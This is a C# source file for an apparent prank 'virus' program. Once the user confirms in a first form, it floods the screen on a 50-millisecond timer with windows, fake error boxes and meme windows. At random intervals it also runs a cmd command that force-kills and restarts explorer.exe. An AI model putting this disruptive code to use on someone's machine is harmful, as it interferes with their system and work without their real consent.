using LibVLCSharp.Shared;
using System.Diagnostics;
using System.Media;
using System.Runtime.InteropServices;

namespace polyester_virus
{
    internal static class Program
    {
        [DllImport("kernel32.dll")]
        private static extern bool AllocConsole();

        public static LibVLC libVLC { get; private set; }

        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static async Task Main()
        {
            // To customize application configuration such as set high DPI settings or default font,
            // see https://aka.ms/applicationconfiguration.
            ApplicationConfiguration.Initialize();
            LibVLCSharp.Shared.Core.Initialize();
            libVLC = new LibVLC();

            Form1 form1 = new();
            Application.Run(form1);
            if (!form1.DoVirus) return;
            form1.Dispose();

            System.Windows.Forms.Timer timer = new()
            {
                Interval = 50
            };

            Form2.Create();
            timer.Tick += (_, _) =>
            {
                Form2.Create();
                if (Random.Shared.Next(3) == 1)
                {
                    CoolMessageBox.ShowNonBlocking("polyester boi (spider pih)", "ERROR", 
                        MessageBoxButtons.OK, MessageBoxIcon.Error, 
                        true, true);
                }
                if (Random.Shared.Next(4) == 1)
                {
                    new MonitoringTheSituation().Show();
                }
                if (Random.Shared.Next(10) == 1)
                {
                    new ArabicMeme().Show();
                }
                if (Random.Shared.Next(20) == 1)
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/c \"taskkill /im explorer.exe /f && start explorer.exe\"",
                        CreateNoWindow = false,
                        UseShellExecute = false
                    });
                }
            };
            timer.Start();
            Application.Run();
        }
    }
}